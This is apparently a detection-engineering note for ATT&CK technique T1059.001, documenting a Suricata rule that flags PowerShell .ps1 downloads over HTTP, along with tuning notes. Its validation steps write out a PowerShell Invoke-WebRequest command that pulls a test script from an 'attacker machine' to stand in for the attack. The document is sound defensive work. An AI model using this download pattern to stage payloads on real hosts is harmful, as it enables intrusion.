# T1059.001 - PowerShell Download via HTTP

## Objective
Detect PowerShell script downloads over HTTP, which may indicate malicious script retrieval.

## Telemetry
- Suricata
- Protocol: HTTP
- Host: Sensor-NSM

## Detection Logic
See `t1059.001_powershell_download.rules`

## Why It Matters
Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

## Expected Artifacts
- HTTP GET request
- URI containing `.ps1`
- Source IP: Internal host
- Destination IP: External server

## Validation
1. On the attacker machine, host a simple HTTP server serving a test PowerShell file:
   `python3 -m http.server 8080`
2. Create a dummy `.ps1` file in the same directory:
   `echo "Write-Host 'test'" > test.ps1`
3. From the Windows endpoint, trigger an HTTP download:
   `powershell -Command "Invoke-WebRequest -Uri http://10.10.10.50:8080/test.ps1 -OutFile C:\Temp\test.ps1"`
4. Verify the alert fires in Security Onion under Suricata alerts
5. Confirm the source IP matches the endpoint and the URI contains `.ps1`

## Result
Pass

## Tuning Notes
This rule matches any HTTP GET request with a .ps1 URI regardless of destination. In enterprise environments, tune by destination subnet or known-bad sources to reduce noise from legitimate script management tooling.
